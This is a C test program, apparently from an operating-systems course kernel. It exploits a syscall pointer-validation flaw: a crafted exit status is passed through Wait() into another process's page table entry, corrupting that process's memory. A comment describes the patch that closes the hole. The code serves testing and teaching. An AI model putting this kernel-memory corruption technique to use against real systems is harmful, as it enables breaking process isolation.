#include <yuser.h>

/*
Before security patch:
This test case is able to exploit the vulnerability by forking a child process and then waiting for the child process to exit.
The child process will exit with a newly modified PTE value, and we will wait on the page table entry of process B,
which will cause process A to malliciously modify the memory of process B, and causes a segmentation fault.

After security patch:
The security patch fixes the vulnerability by checking if the PTE is in region 1 and if it is below the stack and above the break.
If not, the system will exit with an error, and thus the exploit will not be able to succeed.

Applies to:
- Wait()
- Synchronization syscalls that take an address as an argument
*/

int main(void)
{
  TracePrintf(0, "Hello, mallicious!\n");

  // Fork a child to run idle
  // This will be process B, which contains a global variable x that lives in the data segment VPN 3 -> PFN 40
  int rc = Fork();
  if (rc == 0)
  {
    TracePrintf(0, "I am the child, about to exec idle\n");
    Exec("idle", NULL);
    TracePrintf(0, "Should not be here\n");
    Exit(0);
  }

  // Let idle start running
  Delay(10);

  // We want to map our VPN 3 to physical frame 40 which contains x
  int target_vpn = 3;
  int target_pfn = 40;
  // Create a PTE with:
  // - valid = 1
  // - prot = 3 (PROT_READ | PROT_WRITE)
  // - pfn = target_pfn (40)
  int new_pte = 0;
  new_pte |= 0;                 // Set valid bit to invalid
  new_pte |= (3 << 1);          // Set protection bits (PROT_READ | PROT_WRITE)
  new_pte |= (target_pfn << 8); // Set PFN to target_pfn

  TracePrintf(0, "Created PTE value: 0x%08x\n", new_pte);

  // Get a pointer to our page table entry
  int *ptEntry = (int *)0x02b618 + target_vpn;

  // Fork a child to exit with our PTE value
  // This will be process C, which process A will wait on.
  // The way Wait(*address) works, is that it will write to the address passed in, the exit status of the child.
  // Hence, if child C exits with a newly modified PTE, and we wait with the address of process B page table entry,
  // process A will malliciously modify the memory of process B, even though they are completely unrelated.
  int exploit_pid = Fork();
  if (exploit_pid == 0)
  {
    TracePrintf(0, "Child exiting with PTE value 0x%08x\n", new_pte);
    Exit(new_pte);
  }

  // Pass the page table entry directly to Wait to exploit the vulnerability
  TracePrintf(0, "Passing PTE address %p directly to Wait\n", ptEntry);
  Wait(ptEntry);

  // Give time to observe effects
  // This will block process A, run process B, in which we read the value of x.
  // Since now the PTE of x is modified to be invalid, the read should be segfault and OS should halt.
  Delay(10);

  return 0;
}